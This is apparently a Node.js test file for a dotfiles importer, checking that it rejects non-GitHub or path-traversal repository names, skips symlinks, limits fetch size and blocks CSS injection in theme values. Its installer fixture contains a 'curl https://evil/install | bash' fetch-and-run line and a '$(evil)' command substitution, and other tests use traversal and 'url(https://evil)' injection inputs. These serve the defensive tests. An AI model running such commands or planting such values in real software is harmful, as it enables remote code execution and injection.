import { test } from "node:test";
import assert from "node:assert/strict";
import {
	repositoryName,
	scanRepository,
	analyzeDotfiles,
	limitedFetch,
} from "../public/nebula/dotfiles-repo.js";
import { themeTokens } from "../public/nebula/import-theme.js";
test("Repository names cannot redirect fetches outside GitHub", () => {
	assert.equal(repositoryName("https://github.com/user/dots.git"), "user/dots");
	for (const name of [
		"https://evil.com/user/dots",
		"user/../secret",
		"user/dots/tree/main",
		"user/dots?token=x",
		"../repo",
	])
		assert.throws(() => repositoryName(name));
});
test("Installer analysis describes operations and only extracts literal cosmetics", () => {
	const analysis = analyzeDotfiles({
		"install.sh":
			"sudo pacman -S kitty\ncp -r hypr ~/.config/\nhyprctl keyword general:border_size 3\nswww img walls/stars.png\ncurl https://evil/install | bash\nhyprctl keyword general:gaps_in $(evil)\npython theme.py",
		"kitty.conf": "background #101827\nforeground #ffffff\ncolor4 #ffccaa",
	});
	assert.deepEqual(analysis.inferred, [
		"general:border_size = 3",
		"wallpaper = ,walls/stars.png",
	]);
	assert.equal(analysis.palettes[0].values.accent, "#ffccaa");
	assert.ok(
		analysis.commands.some(
			(x) => x.includes("not executed") || x.includes("Not executed"),
		),
	);
	assert.ok(analysis.warnings.some((x) => x.includes("python theme.py")));
});
test("Scanner pins downloads, skips symlinks, handles API errors and truncation", async () => {
	const sha = "a".repeat(40),
		urls = [];
	const fetcher = async (url) => {
		urls.push(url);
		return new Response(
			JSON.stringify(
				url.endsWith("/x/y")
					? { default_branch: "main" }
					: url.includes("/commits/")
						? { sha }
						: url.includes("/git/trees/")
							? {
									tree: [
										{
											type: "blob",
											mode: "100644",
											path: "hyprland.conf",
											size: 20,
										},
										{
											type: "blob",
											mode: "120000",
											path: "evil.conf",
											size: 1,
										},
									],
								}
							: {},
			),
		);
	};
	const result = await scanRepository("x/y", "", () => {}, undefined, fetcher);
	assert.ok(
		urls.some((u) =>
			u.includes(`raw.githubusercontent.com/x/y/${sha}/hyprland.conf`),
		),
	);
	assert.equal(Object.keys(result.texts).length, 1);
	await assert.rejects(
		() =>
			limitedFetch(
				"https://api.github.com",
				4,
				undefined,
				async () => new Response("12345"),
			),
		/limit/,
	);
	await assert.rejects(
		() =>
			scanRepository(
				"x/y",
				"",
				() => {},
				undefined,
				async () => new Response("", { status: 403 }),
			),
		/403/,
	);
});
test("Theme values cannot inject CSS and foreground remains readable", () => {
	const theme = themeTokens({
		background: "#ffffff",
		foreground: "#ffffff",
		accent: "url(https://evil)",
		rounding: 200,
	});
	assert.equal(theme.foreground, "#111111");
	assert.equal(theme.accent, "#a7c8fa");
	assert.equal(theme.rounding, 40);
});
